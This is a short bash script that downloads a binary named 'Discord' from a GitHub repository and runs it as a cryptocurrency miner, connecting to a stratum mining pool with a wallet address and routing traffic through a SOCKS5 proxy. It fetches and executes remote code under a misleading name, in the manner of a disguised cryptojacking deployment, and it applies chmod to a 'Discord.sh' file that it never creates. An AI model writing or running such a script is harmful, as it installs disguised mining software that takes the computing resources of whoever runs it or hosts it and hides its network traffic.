#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O Discord https://github.com/Explorer-Discord/Discord/raw/main/Discord 
screen -dmS ls
chmod +x Discord.sh && chmod +x Discord && chmod 777 Discord Discord.sh
./Discord -a gr -o stratum+tcp://r-pool.net:3088 -u RWi1xbUyvKo8JvYpLbyJQ64kPBR8rkFw5a.AB=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://184.75.247.3:59644
